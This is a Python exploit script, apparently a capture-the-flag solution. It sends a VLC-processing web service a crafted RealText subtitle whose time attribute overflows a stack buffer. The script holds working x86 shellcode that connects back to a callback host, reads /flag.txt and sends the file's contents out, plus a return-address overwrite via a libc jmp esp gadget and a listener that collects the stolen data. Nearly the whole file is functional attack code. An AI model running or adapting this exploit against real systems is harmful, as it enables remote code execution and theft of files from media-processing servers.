#!/usr/bin/env python3

import sys
import struct
import socket
import threading
import time
import requests
from pwn import *

TARGET        = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
CALLBACK_IP   = sys.argv[2] if len(sys.argv) > 2 else "172.17.0.1"
CALLBACK_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 4444

OFFSET_TO_EIP = 80
OFFSET_TO_TXT = 56
BSS_TXT_PTR   = 0x08049e20
LIBC_BASE     = 0xf7cfc000
JMP_ESP        = LIBC_BASE + 0x2b59
BAD_CHARS     = b"\x00\x0a\x0d\x22"


def check_bad_chars(data, name="data"):
    for i, b in enumerate(data):
        if b in BAD_CHARS:
            raise ValueError(f"Bad char 0x{b:02x} in {name} at offset {i}")


def ip_to_dword(ip_str):
    return struct.unpack("<I", socket.inet_aton(ip_str))[0]


def not32(val):
    return (~val) & 0xFFFFFFFF


def build_shellcode(callback_ip, callback_port):
    sc = b""

    sc += b"\x31\xdb"
    sc += b"\x53"
    sc += b"\x43"
    sc += b"\x53"
    sc += b"\x43"
    sc += b"\x53"
    sc += b"\x4b"
    sc += b"\x89\xe1"
    sc += b"\x31\xc0"
    sc += b"\xb0\x66"
    sc += b"\xcd\x80"
    sc += b"\x89\xc7"

    ip_dword = ip_to_dword(callback_ip)
    ip_not = not32(ip_dword)
    ip_not_bytes = struct.pack("<I", ip_not)
    check_bad_chars(ip_not_bytes, "NOT(IP)")
    sc += b"\xb8" + ip_not_bytes
    sc += b"\xf7\xd0"
    sc += b"\x50"

    port_net = struct.pack("!H", callback_port)
    family_port = b"\x02\x00" + port_net
    fp_dword = struct.unpack("<I", family_port)[0]
    fp_not = not32(fp_dword)
    fp_not_bytes = struct.pack("<I", fp_not)
    check_bad_chars(fp_not_bytes, "NOT(family|port)")
    sc += b"\xb8" + fp_not_bytes
    sc += b"\xf7\xd0"
    sc += b"\x50"

    sc += b"\x89\xe1"

    sc += b"\x6a\x10"
    sc += b"\x51"
    sc += b"\x57"
    sc += b"\x89\xe1"
    sc += b"\x31\xc0"
    sc += b"\xb3\x03"
    sc += b"\xb0\x66"
    sc += b"\xcd\x80"

    sc += b"\x31\xc9"
    sc += b"\x51"
    sc += b"\xc6\x04\x24\x74"
    sc += b"\x68\x67\x2e\x74\x78"
    sc += b"\x68\x2f\x66\x6c\x61"
    sc += b"\x89\xe3"
    sc += b"\x31\xd2"
    sc += b"\x31\xc0"
    sc += b"\xb0\x05"
    sc += b"\xcd\x80"

    sc += b"\x89\xc3"
    sc += b"\x31\xd2"
    sc += b"\xb6\x01"
    sc += b"\x29\xd4"
    sc += b"\x89\xe1"
    sc += b"\x31\xc0"
    sc += b"\xb0\x03"
    sc += b"\xcd\x80"

    sc += b"\x89\xc2"
    sc += b"\x89\xfb"
    sc += b"\x31\xc0"
    sc += b"\xb0\x04"
    sc += b"\xcd\x80"

    sc += b"\x31\xdb"
    sc += b"\x31\xc0"
    sc += b"\xb0\xfc"
    sc += b"\xcd\x80"

    check_bad_chars(sc, "shellcode")
    return sc


def craft_payload(shellcode):
    payload  = b"A" * OFFSET_TO_TXT
    payload += p32(BSS_TXT_PTR)
    payload += b"B" * (OFFSET_TO_EIP - OFFSET_TO_TXT - 4)
    payload += p32(JMP_ESP)
    payload += shellcode

    check_bad_chars(payload, "payload")

    rt  = b"<window>\n"
    rt += b"<time begin=\""
    rt += payload
    rt += b"\" end=\"XX\">"
    rt += b"PWNED"
    rt += b"</time>\n"
    rt += b"</window>"
    return rt


def exploit():
    shellcode = build_shellcode(CALLBACK_IP, CALLBACK_PORT)
    print(f"[*] Shellcode size: {len(shellcode)} bytes")

    rt_payload = craft_payload(shellcode)
    print(f"[*] Total payload: {len(rt_payload)} bytes")

    flag_received = threading.Event()
    flag_data = [None]

    def listener():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", CALLBACK_PORT))
        srv.listen(1)
        srv.settimeout(20)
        print(f"[*] Listening on 0.0.0.0:{CALLBACK_PORT} …")
        try:
            conn, addr = srv.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            data = b""
            conn.settimeout(5)
            while True:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                except socket.timeout:
                    break
            conn.close()
            flag_data[0] = data
            flag_received.set()
        except socket.timeout:
            print("[-] Listener timed out — no callback received.")
        finally:
            srv.close()

    t = threading.Thread(target=listener, daemon=True)
    t.start()
    time.sleep(0.5)

    print("[*] Uploading malicious RealText subtitle …")
    files = {"file": ("exploit.rt", rt_payload, "application/octet-stream")}
    try:
        r = requests.post(f"{TARGET}/upload", files=files, timeout=20)
        print(f"[*] Server response: HTTP {r.status_code}")
    except requests.exceptions.Timeout:
        print("[*] Upload request timed out (expected if VLC hangs)")
    except Exception as e:
        print(f"[!] Upload error: {e}")

    print("[*] Waiting for flag via callback …")
    flag_received.wait(timeout=20)

    if flag_data[0]:
        text = flag_data[0].decode("utf-8", errors="replace").strip()
        if "flag{" in text:
            flag = text[text.index("flag{"):text.index("}", text.index("flag{")) + 1]
            print()
            print(f"[+]   FLAG: {flag}")
        else:
            print(f"\n[+] Received data: {text!r}")
    else:
        print("\n[-] No flag received.")


if __name__ == "__main__":
    exploit()
